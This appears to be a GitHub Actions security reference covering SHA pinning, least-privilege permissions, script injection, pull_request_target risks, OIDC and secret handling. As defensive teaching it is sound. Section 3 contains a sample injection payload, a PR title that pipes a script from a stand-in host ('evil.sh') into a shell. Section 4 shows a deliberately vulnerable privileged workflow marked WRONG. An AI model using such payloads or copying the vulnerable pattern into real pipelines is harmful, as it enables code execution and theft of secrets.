# Workflow Security

The four rules in SKILL.md are the non-negotiables. This file is the reasoning and the
worked patterns behind them.

## 1. Pin third-party actions to a full commit SHA

`uses: some/action@v4` resolves a **mutable tag**. Whoever controls that repo can repoint
`v4` at new code, and it runs with your `GITHUB_TOKEN` and your secrets. That is the exact
shape of the `tj-actions/changed-files` compromise: the tags were rewritten to point at a
commit that dumped runner memory into the build log.

```yaml
# WRONG - mutable
- uses: actions/checkout@v4
- uses: actions/checkout@main

# RIGHT - immutable, with the human-readable version alongside
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

The trailing `# vX.Y.Z` comment is not decoration: it is what Dependabot parses to offer the
bump, and what makes a review diff legible.

**Never invent a SHA.** Resolve the real one:

```bash
gh api repos/actions/checkout/commits/v4.2.2 --jq .sha
```

Tools that do the whole file: `pinact run`, `ratchet pin .github/workflows/ci.yml`.
Keep them current with Dependabot:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: {interval: weekly}
```

Exempt from pinning: `actions/*` and `github/*` when your org policy allows it (still
prefer SHAs), local `./.github/actions/<name>`, and `docker://image@sha256:...` (pin the
digest instead of a tag).

## 2. Least-privilege `permissions`

`GITHUB_TOKEN`'s default is repo-configurable and historically write-all. Never rely on it.
Declare the floor once at workflow level and widen per job:

```yaml
permissions:
  contents: read          # workflow-wide floor

jobs:
  test:
    # inherits contents: read
  release:
    permissions:
      contents: write     # create the release
      id-token: write     # OIDC, this job only
```

| Job does | Needs |
|---|---|
| checkout, build, test | `contents: read` |
| comment on a PR or issue | `pull-requests: write` or `issues: write` |
| push a commit, tag, or release | `contents: write` |
| push to GHCR | `packages: write` |
| upload SARIF to code scanning | `security-events: write` |
| assume a cloud role via OIDC | `id-token: write` |
| Pages deploy | `pages: write` + `id-token: write` |

A `permissions:` block is **exhaustive**: everything unlisted is set to `none`. So a job that
declares only `id-token: write` cannot check out the repo - it needs `contents: read` too.

`permissions: write-all` and `permissions: {}` at the top of a real workflow are both wrong:
the first is the whole problem, the second breaks checkout on private repos.

## 3. Never interpolate untrusted input into a shell

`${{ ... }}` is substituted into the script **before** the shell sees it. A PR title of
`"; curl evil.sh | sh; #` becomes a command.

```yaml
# WRONG - script injection
- run: echo "PR ${{ github.event.pull_request.title }}"

# RIGHT - the value arrives as data through the environment
- run: echo "PR $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Attacker-controlled, all of it: `github.event.pull_request.title`, `.body`,
`.head.ref`, `.head.label`, `github.head_ref`, `github.event.issue.title`, `.body`,
`github.event.comment.body`, `github.event.review.body`, `github.event.commits.*.message`,
`github.event.commits.*.author.email`, `github.event.discussion.*`, and any label or branch
name a contributor can set.

The same rule applies to `actions/github-script`: reach for `context.payload...` inside the
script or pass the value through `env`, never string-interpolate it into the JS source.

Safe as-is: `github.sha`, `github.repository`, `github.run_id`, `github.actor` (a username -
constrained charset), `github.event_name`, `github.ref` on a `push` (but `github.ref_name`
on a `pull_request` is the merge ref, not user text).

## 4. `pull_request_target` is a loaded gun

It runs the workflow **from the base branch** with a **read-write token and full access to
secrets**, in the context of a fork PR. That combination is only safe if the job never
executes fork code.

```yaml
# WRONG - checks out and runs attacker code with a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test    # arbitrary code from the PR, privileged
```

Rules:
- Default to `pull_request`. If CI passes without secrets, you do not need anything else.
- Use `pull_request_target` **only** for jobs that touch no PR content - labelling, greeting
  a first-time contributor, assigning reviewers.
- If you must build fork code with secrets, split it: an unprivileged `pull_request` job
  builds and uploads an artifact, and a separate `workflow_run` job with the secrets
  consumes the artifact. Treat the artifact as untrusted data - never execute it.
- Never combine `pull_request_target` with a checkout of `head.sha` or `head.ref`.

Related: `workflow_run` also runs privileged. Same rule - do not execute what the triggering
workflow produced.

## OIDC instead of long-lived cloud keys

Static `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets are the credential most often
leaked from CI. Exchange a short-lived OIDC token for a role instead:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    environment: production
    permissions:
      contents: read
      id-token: write        # required for OIDC; on this job only
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

- `id-token: write` belongs on the deploying job, not the workflow, so no other job can mint
  a token.
- Trust policy on the cloud side is what actually enforces scope. The `sub` condition must
  pin the repo **and** the ref or environment:
  `repo:org/repo:ref:refs/heads/main` or `repo:org/repo:environment:production`.
  A trust policy matching `repo:org/repo:*` lets any branch, including a fork PR branch in
  some configurations, assume the role.
- Azure: `azure/login` with `client-id`/`tenant-id`/`subscription-id`, no
  `creds:`. GCP: `google-github-actions/auth` with `workload_identity_provider`.

## Environments and approvals

```yaml
environment:
  name: production
  url: https://example.com
```

An environment adds required reviewers, a wait timer, and branch restrictions - the only
approval gate Actions has. Environment secrets are only readable by jobs that name the
environment, which is what stops a test job from seeing production credentials.

## Secret handling

- Secrets are masked in logs by exact match only. Anything derived - base64, a substring, a
  JSON re-encode - prints in the clear.
- Never `echo` a secret, and never pass one as a command-line argument (it shows in
  `ps` output and in some action debug logs). Use `env:`.
- Fork PRs never receive secrets. A workflow that needs them cannot be a fork-PR workflow.
- A step that needs a secret should be the only step that gets it: put `env:` on the step,
  not the job.

## Hardening checklist for a review

1. Every non-local `uses:` on a 40-character SHA, with a version comment.
2. Explicit workflow-level `permissions`, widened per job only where needed.
3. No `${{ ... }}` from an attacker-controlled context inside `run:` or `script:`.
4. No `pull_request_target` (or if present, no checkout of PR head and no PR code executed).
5. `timeout-minutes` on every job.
6. `concurrency` set, `cancel-in-progress` only where cancelling is safe.
7. Deploy jobs use OIDC and an `environment`, not static cloud keys.
8. `persist-credentials: false` on `actions/checkout` in any job that later runs untrusted
   code - otherwise the token stays in `.git/config` for that code to read.
